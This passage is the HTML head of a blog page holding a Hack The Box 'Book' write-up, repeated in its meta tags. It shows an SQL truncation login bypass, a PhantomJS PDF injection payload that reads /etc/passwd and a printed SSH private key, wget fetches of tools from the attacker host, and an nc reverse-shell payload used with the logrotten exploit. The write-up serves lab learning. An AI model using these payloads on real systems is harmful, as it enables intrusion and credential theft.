<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Book" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.176 book.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -sV -sT -sC -T5 book.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 04:27 EDT Nmap scan report for book.htb (10.10.10.176) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA) | 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA) |_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: LIBRARY - Read | Learn | Have Fun Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe lets see what it has to offer ? http://book.htb/: We don’t have an account but lets sign up for one. Logging in brings us to what seems to be an online book collection. http://book.htb/home.php: There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin. http://book.htb/collections.php: We also see found the admin’s email admin@book.htb. http://book.htb/contact.php: It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the javascript code where it does the validation of the user’s input when registering. http://book.htb/: 1 2 3 4 5 6 7 8 9 10 11 12 function validateForm() { var x = document.forms[&quot;myForm&quot;][&quot;name&quot;].value; var y = document.forms[&quot;myForm&quot;][&quot;email&quot;].value; if (x == &quot;&quot;) { alert(&quot;Please fill name field. Should not be more than 10 characters&quot;); return false; } if (y == &quot;&quot;) { alert(&quot;Please fill email field. Should not be more than 20 characters&quot;); return false; } } This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, admin@book.htb1234567. After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, admin@book.htb123456, and was successful! This seems like it is vulnerable to SQL Truncation Attack. If we try registering with the email admin@book.htb%20%20%20%20%20%201 and logging it with it, we login as admin@book.htb! However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with gobuster! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ gobuster dir -u http://book.htb/ -w /usr/share/wordlists/dirb/big.txt -t 12 -k -x .php =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://book.htb/ [+] Threads: 12 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php [+] Timeout: 10s =============================================================== 2020/04/09 12:41:45 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /admin (Status: 301) /books.php (Status: 302) /collections.php (Status: 302) /contact.php (Status: 302) /db.php (Status: 200) /docs (Status: 301) /download.php (Status: 302) /feedback.php (Status: 302) /home.php (Status: 302) /images (Status: 301) /index.php (Status: 200) /logout.php (Status: 302) /profile.php (Status: 302) /search.php (Status: 302) /server-status (Status: 403) /settings.php (Status: 302) =============================================================== 2020/04/09 12:51:57 Finished =============================================================== Seems like /admin is what we are looking for. Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention. http://book.htb/admin/collections.php. Clicking on the PDF link beside User will download a .pdf file containing a list of the usernames and emails in a table. Likewise, for the PDF link beside Collections will download a .pdf file containing the list of books on the website. It seems like the .pdf files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: HTML tags. Apparently, HTML tags are being rendered when generating the pdf files. This is what happens when I change my username to &lt;h1&gt;I am a H1&lt;/h1&gt;: Interesting… Lets see if we can perform SSRF with this: First I start a nc server on port 80 to receive the web request. 1 2 $ nc -lvnp 80 listening on [any] 80 ... I then change my username to &lt;img src =&quot;http://10.10.XX.XX&quot;&gt; and download the .pdf again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the PDF link for Collections. This time, I put &lt;img src =&quot;http://10.10.XX.XX&quot;&gt; as the Book Title, uploaded a random file and then download the .pdf file. On my nc, I caught the raw web request: 1 2 3 4 5 6 7 8 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 Accept: */* Connection: Keep-Alive Accept-Encoding: gzip, deflate Accept-Language: en,* Host: 10.10.XX.XX SSRF was successful but what caught my eye was the PhantomJS in the User-Agent header. 1 2 3 4 5 PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD. Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG. The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image. Exploitation (1) From this link, it states that PhantomJS has the function to create PDFs from HTML. Cool! To exploit this, I followed this guide to read the /etc/passwd file. Submitting the following as my Book Title: 1 &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt; Returns this pdf: Hmm…There is the ssh service running on the machine and there is a user called reader with the home directory at /home/reader. Lets see if we can find any private keys in /home/reader/.ssh, which are typically named as id_rsa. 1 &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(&#39;&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(&#39;&lt;p style=&quot;width:100%; word-wrap: break-word;&quot;&gt;&#39; + this.responseText + &#39;&lt;/p&gt;&#39;)};x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&lt;/script&gt; Notice that I had to specify width of 100% and break-word. This is because the key was too long and parts of the key will be missed out if I didn’t. I then used pdftotext to convert the PDF to text: 1 $ pdftotext 19868.pdf Because of the break-word, you will need to manually remove the newlines to fix the private key. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ cat 19868.txt -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0 WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0 ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6 GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4= -----END RSA PRIVATE KEY----- user.txt Using the private key, we can ssh into the box. 1 2 3 4 $ chmod 700 19868.txt $ ssh -i 19868.txt reader@book.htb reader@book:~$ cat user.txt 51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) In the home directory was I first uploaded pspy to /tmp so that I could monitor for processes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 reader@book:/tmp$ wget http://10.10.XX.XX/pspy --2020-07-11 11:40:51-- http://10.10.XX.XX/pspy Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1090528 (1.0M) [application/octet-stream] Saving to: ‘pspy’ pspy 100%[===============================================================================================================================&gt;] 1.04M 584KB/s in 1.8s 2020-07-11 11:40:54 (584 KB/s) - ‘pspy’ saved [1090528/1090528] reader@book:/tmp$ chmod +x pspy &amp;&amp; ./pspy ... 2020/07/11 11:50:22 CMD: UID=0 PID=48727 | /usr/sbin/logrotate -f /root/log.cfg logrotate was being ran from time to time as root and its version was outdated! 1 2 reader@book:/tmp$ logrotate --version logrotate 3.11.0 Exploitation (2) According to this link, logrotate version 3.15.1 and below are vulnerable to an exploit called logrotten. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 reader@book:/tmp$ wget http://10.10.XX.XX/logrotten.c --2020-07-11 12:43:27-- http://10.10.14.7/logrotten.c Connecting to 10.10.14.7:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5796 (5.7K) [text/plain] Saving to: ‘logrotten.c’ logrotten.c 100%[===============================================================================================================================&gt;] 5.66K --.-KB/s in 0.006s 2020-07-11 12:43:27 (975 KB/s) - ‘logrotten.c’ saved [5796/5796] reader@book:/tmp$ gcc logrotten.c reader@book:/tmp$ gcc logrotten.c -o logrotten reader@book:/tmp$ ./logrotten usage: logrotten [OPTION...] &lt;logfile&gt; -h --help Print this help -t --targetdir &lt;dir&gt; Abosulte path to the target directory -p --payloadfile &lt;file&gt; File that contains the payload -s --sleep &lt;sec&gt; Wait before writing the payload -d --debug Print verbose debug messages -c --compress Hijack compressed files instead of created logfiles -o --open Use IN_OPEN instead of IN_MOVED_FROM To use logrotten, we need to prepare a script that will act as our payload. 1 2 cat payloadfile rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f The above script creates a reverse shell connection back to us, so need to prepare a listener as well using nc. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a access.log in /home/reader/backups/. Echoing a line into it causes it to rotate immediately! 1 2 3 4 5 6 7 8 9 10 11 12 reader@book:~/backups$ ls -al total 8 drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:42 access.log reader@book:~/backups$ echo something &gt;&gt; access.log reader@book:~/backups$ ls -al total 12 drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:59 access.log -rw-r--r-- 1 reader reader 10 Jul 11 13:59 access.log.1 To execute logrotten successfully, I will need to start another ssh session that will echo the line into access.log while my current ssh session will execute logrotten. On current ssh session: 1 2 reader@book:/tmp$ ./logrotten -p payloadfile /home/reader/backups/access.log Waiting for rotating /home/reader/backups/access.log... On another ssh session: 1 reader@book:~/backups$ echo something &gt;&gt; access.log On current ssh session again: 1 2 3 Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d Waiting 1 seconds before writing payload... Done! root.txt logrotten has successfully created a symbolic link of our payload to /etc/bash_completion.d, so now we just need to run /bin/bash to force the execution of our payload and voila, we caught the shell as root! 1 2 3 4 5 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 49512 # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt 84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.176 book.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -sV -sT -sC -T5 book.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 04:27 EDT Nmap scan report for book.htb (10.10.10.176) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA) | 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA) |_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: LIBRARY - Read | Learn | Have Fun Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe lets see what it has to offer ? http://book.htb/: We don’t have an account but lets sign up for one. Logging in brings us to what seems to be an online book collection. http://book.htb/home.php: There was a page where we could upload our own books but it will be subjected to approval, which I believe is by the admin. http://book.htb/collections.php: We also see found the admin’s email admin@book.htb. http://book.htb/contact.php: It took a while to look for a possible vector into the box but I happened to chance upon something on the login/register page where I saw a certain segment in the javascript code where it does the validation of the user’s input when registering. http://book.htb/: 1 2 3 4 5 6 7 8 9 10 11 12 function validateForm() { var x = document.forms[&quot;myForm&quot;][&quot;name&quot;].value; var y = document.forms[&quot;myForm&quot;][&quot;email&quot;].value; if (x == &quot;&quot;) { alert(&quot;Please fill name field. Should not be more than 10 characters&quot;); return false; } if (y == &quot;&quot;) { alert(&quot;Please fill email field. Should not be more than 20 characters&quot;); return false; } } This validation code is poorly implemented as even though the alerts informs the user of the character limit, it does not enforce it. Lets check if this is enfored on the server side. I decided to register a new account but with an email of length 21, admin@book.htb1234567. After submitting the above request, I tried to logging in but failed due to wrong credentials. Is it possible that my email was truncated? I tried logging in one more time but with one character less, admin@book.htb123456, and was successful! This seems like it is vulnerable to SQL Truncation Attack. If we try registering with the email admin@book.htb%20%20%20%20%20%201 and logging it with it, we login as admin@book.htb! However, not much can be done but perhaps there is an admin page somewhere so lets brute-force some directories with gobuster! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ gobuster dir -u http://book.htb/ -w /usr/share/wordlists/dirb/big.txt -t 12 -k -x .php =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://book.htb/ [+] Threads: 12 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php [+] Timeout: 10s =============================================================== 2020/04/09 12:41:45 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htpasswd (Status: 403) /.htpasswd.php (Status: 403) /admin (Status: 301) /books.php (Status: 302) /collections.php (Status: 302) /contact.php (Status: 302) /db.php (Status: 200) /docs (Status: 301) /download.php (Status: 302) /feedback.php (Status: 302) /home.php (Status: 302) /images (Status: 301) /index.php (Status: 200) /logout.php (Status: 302) /profile.php (Status: 302) /search.php (Status: 302) /server-status (Status: 403) /settings.php (Status: 302) =============================================================== 2020/04/09 12:51:57 Finished =============================================================== Seems like /admin is what we are looking for. Fortunately for us, we already have the admin credentials so lets just login with it. However, there was only one page that caught my attention. http://book.htb/admin/collections.php. Clicking on the PDF link beside User will download a .pdf file containing a list of the usernames and emails in a table. Likewise, for the PDF link beside Collections will download a .pdf file containing the list of books on the website. It seems like the .pdf files are generated on the fly but the question is how? I tried inject all sort of values but something stuck out: HTML tags. Apparently, HTML tags are being rendered when generating the pdf files. This is what happens when I change my username to &lt;h1&gt;I am a H1&lt;/h1&gt;: Interesting… Lets see if we can perform SSRF with this: First I start a nc server on port 80 to receive the web request. 1 2 $ nc -lvnp 80 listening on [any] 80 ... I then change my username to &lt;img src =&quot;http://10.10.XX.XX&quot;&gt; and download the .pdf again. Sadly I did not get any request, probably because the name was truncated to probably 10 characters if you remember from registration validation code. Lets try to submit a book and use the PDF link for Collections. This time, I put &lt;img src =&quot;http://10.10.XX.XX&quot;&gt; as the Book Title, uploaded a random file and then download the .pdf file. On my nc, I caught the raw web request: 1 2 3 4 5 6 7 8 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 55942 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 Accept: */* Connection: Keep-Alive Accept-Encoding: gzip, deflate Accept-Language: en,* Host: 10.10.XX.XX SSRF was successful but what caught my eye was the PhantomJS in the User-Agent header. 1 2 3 4 5 PhantomJS is a headless web browser scriptable with JavaScript. It runs on Windows, macOS, Linux, and FreeBSD. Using QtWebKit as the back-end, it offers fast and native support for various web standards: DOM handling, CSS selector, JSON, Canvas, and SVG. The following simple script for PhantomJS loads Google homepage, waits a bit, and then captures it to an image. Exploitation (1) From this link, it states that PhantomJS has the function to create PDFs from HTML. Cool! To exploit this, I followed this guide to read the /etc/passwd file. Submitting the following as my Book Title: 1 &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt; Returns this pdf: Hmm…There is the ssh service running on the machine and there is a user called reader with the home directory at /home/reader. Lets see if we can find any private keys in /home/reader/.ssh, which are typically named as id_rsa. 1 &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(&#39;&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(&#39;&lt;p style=&quot;width:100%; word-wrap: break-word;&quot;&gt;&#39; + this.responseText + &#39;&lt;/p&gt;&#39;)};x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&lt;/script&gt; Notice that I had to specify width of 100% and break-word. This is because the key was too long and parts of the key will be missed out if I didn’t. I then used pdftotext to convert the PDF to text: 1 $ pdftotext 19868.pdf Because of the break-word, you will need to manually remove the newlines to fix the private key. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ cat 19868.txt -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0 WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0 ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6 GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4= -----END RSA PRIVATE KEY----- user.txt Using the private key, we can ssh into the box. 1 2 3 4 $ chmod 700 19868.txt $ ssh -i 19868.txt reader@book.htb reader@book:~$ cat user.txt 51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) In the home directory was I first uploaded pspy to /tmp so that I could monitor for processes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 reader@book:/tmp$ wget http://10.10.XX.XX/pspy --2020-07-11 11:40:51-- http://10.10.XX.XX/pspy Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1090528 (1.0M) [application/octet-stream] Saving to: ‘pspy’ pspy 100%[===============================================================================================================================&gt;] 1.04M 584KB/s in 1.8s 2020-07-11 11:40:54 (584 KB/s) - ‘pspy’ saved [1090528/1090528] reader@book:/tmp$ chmod +x pspy &amp;&amp; ./pspy ... 2020/07/11 11:50:22 CMD: UID=0 PID=48727 | /usr/sbin/logrotate -f /root/log.cfg logrotate was being ran from time to time as root and its version was outdated! 1 2 reader@book:/tmp$ logrotate --version logrotate 3.11.0 Exploitation (2) According to this link, logrotate version 3.15.1 and below are vulnerable to an exploit called logrotten. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 reader@book:/tmp$ wget http://10.10.XX.XX/logrotten.c --2020-07-11 12:43:27-- http://10.10.14.7/logrotten.c Connecting to 10.10.14.7:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5796 (5.7K) [text/plain] Saving to: ‘logrotten.c’ logrotten.c 100%[===============================================================================================================================&gt;] 5.66K --.-KB/s in 0.006s 2020-07-11 12:43:27 (975 KB/s) - ‘logrotten.c’ saved [5796/5796] reader@book:/tmp$ gcc logrotten.c reader@book:/tmp$ gcc logrotten.c -o logrotten reader@book:/tmp$ ./logrotten usage: logrotten [OPTION...] &lt;logfile&gt; -h --help Print this help -t --targetdir &lt;dir&gt; Abosulte path to the target directory -p --payloadfile &lt;file&gt; File that contains the payload -s --sleep &lt;sec&gt; Wait before writing the payload -d --debug Print verbose debug messages -c --compress Hijack compressed files instead of created logfiles -o --open Use IN_OPEN instead of IN_MOVED_FROM To use logrotten, we need to prepare a script that will act as our payload. 1 2 cat payloadfile rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.XX.XX 1337 &gt;/tmp/f The above script creates a reverse shell connection back to us, so need to prepare a listener as well using nc. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a access.log in /home/reader/backups/. Echoing a line into it causes it to rotate immediately! 1 2 3 4 5 6 7 8 9 10 11 12 reader@book:~/backups$ ls -al total 8 drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:42 access.log reader@book:~/backups$ echo something &gt;&gt; access.log reader@book:~/backups$ ls -al total 12 drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:59 access.log -rw-r--r-- 1 reader reader 10 Jul 11 13:59 access.log.1 To execute logrotten successfully, I will need to start another ssh session that will echo the line into access.log while my current ssh session will execute logrotten. On current ssh session: 1 2 reader@book:/tmp$ ./logrotten -p payloadfile /home/reader/backups/access.log Waiting for rotating /home/reader/backups/access.log... On another ssh session: 1 reader@book:~/backups$ echo something &gt;&gt; access.log On current ssh session again: 1 2 3 Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d Waiting 1 seconds before writing payload... Done! root.txt logrotten has successfully created a symbolic link of our payload to /etc/bash_completion.d, so now we just need to run /bin/bash to force the execution of our payload and voila, we caught the shell as root! 1 2 3 4 5 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 49512 # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt 84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/book-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/book-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-12T10:31:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Book" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/book-htb/"},"description":"Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM. What I learnt 